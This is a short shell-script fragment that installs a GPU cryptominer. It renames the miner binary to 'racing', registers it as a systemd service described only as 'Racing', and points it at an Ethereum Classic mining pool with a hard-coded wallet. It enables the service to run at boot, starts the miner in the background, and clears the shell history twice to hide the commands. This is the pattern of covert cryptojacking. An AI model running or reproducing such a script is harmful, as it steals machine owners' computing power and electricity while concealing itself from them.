...
mv t-rex racing
sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing --algo etchash -o us-etc.2miners.com:1010 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w ${myworker}_re\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
sudo systemctl daemon-reload
sudo systemctl enable racing.service
history -c
./racing --algo etchash -o us-etc.2miners.com:1010 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w $myworker &
history -c
